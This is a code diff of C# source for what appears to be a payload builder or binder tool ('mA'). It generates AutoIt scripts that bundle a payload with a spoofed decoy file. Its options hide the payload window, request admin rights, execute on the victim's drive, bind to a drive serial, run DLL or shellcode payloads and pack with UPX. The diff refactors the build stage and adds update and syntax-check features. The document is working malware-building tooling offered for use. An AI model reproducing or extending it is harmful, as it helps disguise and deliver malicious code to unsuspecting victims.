@@ -23,6 +23,7 @@ namespace masamangalternatibo {
         string[] payloadFile = new string[2]; // Stores the data of ofdPayload.FileName incase the user switches modes // 0 = File Payload // 1 = DLL Payload
         public bool[] excomp = { false, false, false}; // Acts as a switch if the external components exist or not // 0 = Icon Library // 1 = UPX // 2 = Get Drive Serial
         public bool isicon = false; //Keeps track if there's a selected / designated icon
+        string templateData = "";
         public int overflowCount = 20;
         string apth = Application.StartupPath;
 
@@ -62,7 +63,7 @@ namespace masamangalternatibo {
                 "Payload Template",
                 "payloadTemplate.txt",
                 "???",
-                "https://gist.github.com/tragenalpha/5c6e9b584132cd694aee64a18cffe1ed/raw/4ddaaac0161c25e8e0dd03a38577d416c5fa918d/payloadTemplate.au3",
+                "",
                 "The Payload Template is a text file that contains the payload script structure that is read by the program and is parsed to create your payload.",
                 true
             );
@@ -73,6 +74,24 @@ namespace masamangalternatibo {
                 "372kb",
                 "",
                 "This component is used to obtain a drive's serial number for creating carrier binded payloads."
+            );
+
+            checkComponent(
+                "AutoIt Syntax Checker",
+                "Au3Check.exe",
+                "191kb",
+                "",
+                "This component is used to check for syntax errors in the generated script (payload).",
+                true
+            );
+
+            checkComponent(
+                "AutoIt Syntax Checker's DAT File",
+                "Au3Check.dat",
+                "12.6kb",
+                "",
+                "This file is used by the Syntax Checker.",
+                true
             );
 
             loadDrives();
@@ -183,12 +202,12 @@ namespace masamangalternatibo {
          Check Component Function - Checks the external components of mA.
          ------------------------------------------------------------------------------------------------- 
          checkComponent(
-                Component Name,
-                File Name,
-                File Size,
-                Download Link,
-                Component Description,
-                Importance (Optional) | Value: false = Optional Component, true = Important Component
+                Component Name (string),
+                File Name (string),
+                File Size (string),
+                Download Link (string),
+                Component Description (string),
+                Importance (bool | Optional = false) | Value: false = Optional Component, true = Important Component
          )
          -------------------------------------------------------------------------------------------------
          *returns: true = The component exists / has been downloaded, false = The component doesn't exist
@@ -236,8 +255,8 @@ namespace masamangalternatibo {
          Extract Icon Function - used to extract icons by utilizing the IconLib Library.
          ----------------------------------------------------------------------------------
          extractIcon(
-                From button Boolean Value,
-                File to extract the Icon from
+                From button Boolean Value (bool),
+                File to extract the Icon from (string)
          )
          ----------------------------------------------------------------------------------
          *fromButton suppresses error if it wasn't the users' intention to extract an icon
@@ -321,8 +340,7 @@ namespace masamangalternatibo {
          --------------------------------------------------------------------------
          openminipad(
                 string to pass to mprtb (string),
-                Enable Pass to shell button (bool),
-                Enable Build button (bool)
+                Enable Modify Script button (bool)
          )
          --------------------------------------------------------------------------
          *Two or more instances uses the same code with small change of detail.
@@ -330,11 +348,15 @@ namespace masamangalternatibo {
         */
         private void openminipad(string writetb = "", bool enaBuild = false) {
             using (minipad _minipad = new minipad()) {
-                _minipad._tmp = trimext(tbSpoof.Text);
                 _minipad.btnCompileScript.Enabled = false;
-                if (enaBuild) { _minipad.btnCompileScript.Enabled = true;}
+                if (enaBuild) {_minipad.btnCompileScript.Enabled = true;}
                 _minipad.mprtb.Text = writetb;
                 _minipad.ShowDialog();
+                if (_minipad._modifyscript) {
+                    templateData = _minipad._newscript;
+                    dbgmsg("Script Modified!");
+                    startBuild(false, true);
+                }
             }
         }
 
@@ -358,11 +380,9 @@ namespace masamangalternatibo {
                 return;
             }
 
-            if (payloadMode == 1) {
-                if (tbArguments.Text == "") {
-                    MessageBox.Show("DLL payload arguments is empty!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-                    return;
-                }
+            if (payloadMode == 1 && (tbArguments.Text == "" || tbArguments.Text == "<entrypoint> <optional arguments>")) {
+                MessageBox.Show("DLL payload arguments is empty!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
             }
 
             if (drpDrives.Items.Count < 1) {
@@ -378,73 +398,78 @@ namespace masamangalternatibo {
         }
 
         /*
-        Start Build Function - a function that generates the payload script with the corresponding options provided by the user.
-        ---------------------------------------------------------------------------------------------------------------------------------------
+        Start Build Function - a function that generates the payload script with the corresponding options provided by the user. (Pre-Build Stage)
+        --------------------------------------------------------------------------------------------------------------------------------------------
          stratBuild(
                 Is in write mode (bool)
+                Skip pre-build process (bool)
          )
-        ---------------------------------------------------------------------------------------------------------------------------------------
+        --------------------------------------------------------------------------------------------------------------------------------------------
         *returns: nothing
         */
-        private void startBuild(bool isWriteMode) {
+        private void startBuild(bool isWriteMode = false, bool skipprebuild = false) {
+            if (skipprebuild == false) {
+                dbgmsg("Starting build...");
+                dbgmsg("Importing template...");
 
-            /*
-             * scriptData Array String Variable - Stores the temporary data to be written in the script through String.Format
-             * ---------------------------------------------------------------------------------------------------------------
-             * Index Representation Values
-             *   0  - #RequireAdmin pre-processor
-             *   1  - Payload arguments placeholder (string)
-             *   2  - Execute through console (bool)
-             *   3  - Stream console output to a text file (bool)
-             *   4  - Execute in victims' drive (bool)
-             *   5  - Payload name (string)
-             *   6  - Spoofed File name (string)
-             *   7  - Hide/Show Payload Window (Macro | @SW_SHOW / @SW_HIDE)
-             *   8  - Console command execution switch (String | /k or /c)
-             *   9  - Type of payload (integer | 0 = payload / 2 = dll payload / 3 = shell code)
-             *   10 - Driver Serial Check (bool)
-             *   11 - Driver Serial to Check (String)
-            */
-            string[] scriptData = new string[12];
+                templateData = File.ReadAllText("payloadTemplate.txt");
 
-            dbgmsg("Starting build...");
-            dbgmsg("Importing template...");
+                if (payloadMode != 2) {
+                    dbgmsg("Importing payload...");
+                    if (File.Exists("$payloadtmp")) File.Delete("$payloadtmp");
+                    File.Copy(payloadFile[payloadMode], "$payloadtmp");
+                }
 
-            string templateData = File.ReadAllText("payloadTemplate.txt");
+                dbgmsg("Importing spoofed file...");
+                if (File.Exists("$spooftmp")) File.Delete("$spooftmp");
+                File.Copy(ofdSpoof.FileName, "$spooftmp");
 
-            if (payloadMode != 2) {
-                dbgmsg("Importing payload...");
-                if (File.Exists("$payloadtmp")) File.Delete("$payloadtmp");
-                File.Copy(payloadFile[payloadMode], "$payloadtmp");
+                /*
+                 * scriptData Array String Variable - Stores the temporary data to be written in the script through String.Format
+                 * ---------------------------------------------------------------------------------------------------------------
+                 * Index Representation Values
+                 *   0  - #RequireAdmin pre-processor
+                 *   1  - Payload arguments placeholder (string)
+                 *   2  - Execute through console (bool)
+                 *   3  - Stream console output to a text file (bool)
+                 *   4  - Execute in victims' drive (bool)
+                 *   5  - Payload name (string)
+                 *   6  - Spoofed File name (string)
+                 *   7  - Hide/Show Payload Window (Macro | @SW_SHOW / @SW_HIDE)
+                 *   8  - Console command execution switch (String | /k or /c)
+                 *   9  - Type of payload (integer | 0 = payload / 2 = dll payload / 3 = shell code)
+                 *   10 - Driver Serial Check (bool)
+                 *   11 - Driver Serial to Check (String)
+                */
+
+                dbgmsg("Writing parsed script to memory...");
+                templateData = String.Format(
+                    templateData,
+
+                    (chkAdminFlag.Checked ? "#RequireAdmin" : null),
+                    ((payloadMode != 2) ? (chkArguments.Checked ? tbArguments.Text : null) : tbPayload.Text),
+                    ((payloadMode == 0 && chkConsole.Checked) ? "true" : "false"),
+                    ((payloadMode == 0 && chkConsole.Checked && chkStreamConsole.Checked) ? "true" : "false"),
+                    ((payloadMode == 0 && chkTarExe.Checked) ? "true" : "false"),
+                    ((payloadMode != 2) ? tbPayload.Text : null),
+                    tbSpoof.Text,
+                    (chkHidWin.Checked ? "@SW_HIDE" : "@SW_SHOW"),
+                    ((payloadMode == 0 && chkConsole.Checked) ? btnCommand.Text : ""),
+                    payloadMode.ToString(),
+                    (chkSerial.Checked && excomp[2] ? "true" : "false"),
+                    (chkSerial.Checked && excomp[2] ? getSerial(drpDrives.GetItemText(drpDrives.SelectedItem)) : "0000000000")
+
+                    );
+
+                if (payloadMode == 2) {
+                    dbgmsg("Creating Payload placeholder...");
+                    if (File.Exists("$payloadtmp")) File.Delete("$payloadtmp");
+                    File.Create("$payloadtmp").Close();
+                }
+
             }
 
-            dbgmsg("Importing spoofed file...");
-            if (File.Exists("$spooftmp")) File.Delete("$spooftmp");
-            File.Copy(ofdSpoof.FileName, "$spooftmp");
-
-            dbgmsg("Writing sections...");
-            scriptData[0] = (chkAdminFlag.Checked ? "#RequireAdmin": null);
-            scriptData[1] = ((payloadMode != 2) ? (chkArguments.Checked ? tbArguments.Text : null) : tbPayload.Text);
-            scriptData[2] = ((payloadMode == 0 && chkConsole.Checked) ? "true" : "false");
-            scriptData[3] = ((payloadMode == 0 && chkConsole.Checked && chkStreamConsole.Checked) ? "true" : "false");
-            scriptData[4] = ((payloadMode == 0 && chkTarExe.Checked) ? "true" : "false");
-            scriptData[5] = ((payloadMode != 2) ? tbPayload.Text : null);
-            scriptData[6] = tbSpoof.Text;
-            scriptData[7] = (chkHidWin.Checked ? "@SW_HIDE":"@SW_SHOW");
-            scriptData[8] = ((payloadMode == 0 && chkConsole.Checked) ? btnCommand.Text : "");
-            scriptData[9] = payloadMode.ToString();
-            scriptData[10] = (chkSerial.Checked && excomp[2] ? "true" : "false");
-            scriptData[11] = (chkSerial.Checked && excomp[2] ? getSerial(drpDrives.GetItemText(drpDrives.SelectedItem)) : "0000000000");
-
-            dbgmsg("Writing parsed script to memory...");
-            templateData = String.Format(templateData, scriptData[0], scriptData[1], scriptData[2], scriptData[3], scriptData[4], scriptData[5], scriptData[6], scriptData[7], scriptData[8], scriptData[9], scriptData[10], scriptData[11]);
-
-            if (payloadMode == 2) {
-                dbgmsg("Creating Payload placeholder...");
-                if (File.Exists("$payloadtmp")) File.Delete("$payloadtmp");
-                File.Create("$payloadtmp").Close();
-            }
-
+            //
             if (isWriteMode) {
                 openminipad(templateData, true);
             }
@@ -467,6 +492,7 @@ namespace masamangalternatibo {
                     _bp.script = templateData;
                     _bp.drive = drpDrives.GetItemText(drpDrives.SelectedItem);
                     _bp.isicon = isicon;
+                    _bp.upx = excomp[1];
                     _bp.ShowDialog();
                 }
             }
@@ -572,8 +598,8 @@ namespace masamangalternatibo {
             payloadData[payloadMode] = tbPayload.Text; //Save the current payloadData to be displayed later
 
             payloadMode++;
-            if (payloadMode == 3) { payloadMode = 0; }
-            payloadData[payloadMode + 2] = tbArguments.Text;
+            if (payloadMode == 3) payloadMode = 0;
+            if (payloadMode != 0) payloadData[payloadMode + 2] = tbArguments.Text;
 
             switch (payloadMode) {
                 case 0: //Payload File Mode
@@ -597,7 +623,7 @@ namespace masamangalternatibo {
                     ofdPayload.Filter = "DLL Files (*.dll)|*.dll";
                     chkArguments.Checked = true;
                     tbArguments.Text = payloadData[4];
-                    if (tbArguments.Text == "") { tbArguments.Text = "<entrypoint> <optional arguments>"; }
+                    if (tbArguments.Text == "") tbArguments.Text = "<entrypoint> <optional arguments>";
                     break;
 
                 case 2: //Shell Code Mode
@@ -617,7 +643,7 @@ namespace masamangalternatibo {
             if (testNet("8.8.8.8", true)) {
                 XmlDocument _xml = new XmlDocument();
                 _xml.Load("https://raw.githubusercontent.com/tragenalpha/masamangalternatibo/master/mAupdate.xml");
-                if (MessageBox.Show("Recent Payload Template Version: " + _xml.SelectSingleNode("/root/payload/version").InnerText + "\n\nWould you like to obtain this version?", "Payload Update", MessageBoxButtons.YesNo) == DialogResult.Yes) {
+                if (MessageBox.Show("Recent Payload Template Version: " + _xml.SelectSingleNode("/root/payload/version").InnerText + "\n\nWould you like to obtain this version?\nLink: " + _xml.SelectSingleNode("/root/payload/link").InnerText, "Payload Update", MessageBoxButtons.YesNo) == DialogResult.Yes) {
                     using (WebClient _wc = new WebClient()) {
                         File.WriteAllText("payloadTemplate.txt", _wc.DownloadString(_xml.SelectSingleNode("/root/payload/link").InnerText));
                         MessageBox.Show("Payload Obtained!", "Payload Update");
@@ -627,7 +653,13 @@ namespace masamangalternatibo {
         }
 
         private void btnUpdma_Click(object sender, EventArgs e) {
-
+            if (testNet("8.8.8.8", true)) {
+                XmlDocument _xml = new XmlDocument();
+                _xml.Load("https://raw.githubusercontent.com/tragenalpha/masamangalternatibo/master/mAupdate.xml");
+                if (MessageBox.Show("Recent mA Version Release: " + _xml.SelectSingleNode("/root/ma/version").InnerText + "\nYour mA Version: " + globalClass.version + "\n\nWould you like to open the Github release page on your browser?\nLink: " + _xml.SelectSingleNode("/root/ma/link").InnerText, "mA Update", MessageBoxButtons.YesNo) == DialogResult.Yes) {
+                    Process.Start(_xml.SelectSingleNode("/root/ma/link").InnerText);
+                }
+            }
         }
 
         private void btnRefreshDrives_Click(object sender, EventArgs e) {
